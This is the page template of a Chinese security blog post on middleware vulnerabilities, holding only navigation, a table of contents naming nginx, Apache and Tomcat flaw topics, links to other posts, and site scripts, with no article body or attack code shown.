  <a href="/2023/06/02/k8s%E9%AB%98%E7%BA%A7/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;49bee8cf2d93684cad9a1acc8bc17d8a.jpg" title="k8s高级">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>k8s高级</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/08/02/Capabilities/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;a956521148df0241038d6f6838a9806f.jpg" title="docker底层原理+capability">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>docker底层原理+capability</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nginx%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> nginx 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi-fastcgi-php-cgi-php-fpm"><span class="toc-number">1.1.</span> <span class="toc-text"> CGI、FastCGI、php-cgi、php-fpm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cgi"><span class="toc-number">1.1.1.</span> <span class="toc-text"> CGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi"><span class="toc-number">1.1.2.</span> <span class="toc-text"> fastcgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fpm"><span class="toc-number">1.1.3.</span> <span class="toc-text"> php-fpm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-cgi"><span class="toc-number">1.1.4.</span> <span class="toc-text"> php-cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sapi"><span class="toc-number">1.1.5.</span> <span class="toc-text"> sapi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx-php"><span class="toc-number">1.2.</span> <span class="toc-text"> nginx + php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fastcgi%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text"> php fastcgi 配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text"> PHP-FPM 未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi-record"><span class="toc-number">1.3.1.</span> <span class="toc-text"> Fastcgi Record</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi-type"><span class="toc-number">1.3.2.</span> <span class="toc-text"> Fastcgi Type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nginxiis7%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text"> Nginx（IIS7）解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.4.</span> <span class="toc-text"> PHP-FPM 未授权访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text"> nginx 文件名逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">1.5.</span> <span class="toc-text"> nginx 错误配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.1.</span> <span class="toc-text"> CRLF 注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bottle-http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text"> bottle http 头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E9%98%BB%E6%AD%A2%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B7%B3%E8%BD%AC%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.2.1.</span> <span class="toc-text"> 两种阻止浏览器跳转的方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 目录穿越漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add_header%E8%A2%AB%E8%A6%86%E7%9B%96"><span class="toc-number">1.5.4.</span> <span class="toc-text"> add_header 被覆盖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text"> nginx 解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lnmp%E6%9E%B6%E6%9E%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.7.</span> <span class="toc-text"> LNMP 架构漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#filter_validate_email%E7%BB%95%E8%BF%87"><span class="toc-number">1.7.1.</span> <span class="toc-text">  FILTER_VALIDATE_EMAIL  绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87nginx-host%E9%99%90%E5%88%B6"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 绕过 Nginx Host 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 第一种处理方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 第二种处理方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 第三种处理方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-57-insert%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.6.</span> <span class="toc-text"> Mysql 5.7 INSERT 注入方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.7.</span> <span class="toc-text"> 报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96"><span class="toc-number">1.8.</span> <span class="toc-text"> nginx 越界读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#apach%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> apach 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text"> Apache HTTPD 换行解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-server-2449%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text"> HTTP Server 2.4.49 路径穿越漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-http-server-2450-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text"> Apache HTTP Server 2.4.50 路径穿越漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-http-server-2448-mod_proxy-ssrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text"> Apache HTTP Server 2.4.48 mod_proxy SSRF 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-httpd-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.5.</span> <span class="toc-text"> Apache HTTPD 多后缀解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text"> Apache SSI 远程命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat"><span class="toc-number">3.</span> <span class="toc-text"> tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat-put%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text"> Tomcat PUT 方法任意写文件漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat7-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text"> Tomcat7+ 弱口令 &amp;&amp; 后台 getshell 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aapache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text"> Aapache Tomcat AJP 文件包含漏洞</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">41</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">4</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/06/02/k8s%E9%AB%98%E7%BA%A7/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/08/02/Capabilities/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/12/28/mysql/" title="Mysql">Mysql</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/11/reverse/" title="逆向">逆向</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/09/01/border%20leaf/" title="从三层架构到spine leaf">从三层架构到spine leaf</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
</div>

    <span><a href="/2022/12/25/%E5%86%85%E7%BD%91/" title="内网渗透">内网渗透</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/27/CDN/" title="CDN&amp;DNS">CDN&DNS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/15/Nginx_new/" title="Nginx">Nginx</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2023/08/22/%E5%8E%BB%E5%BC%B9%E7%AA%97%E7%BB%BF%E5%8C%96/" title="破解相关">破解相关</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2023/10/03/hg%20ker/" title="hg内核">hg内核</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/07/15/中间件漏洞/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
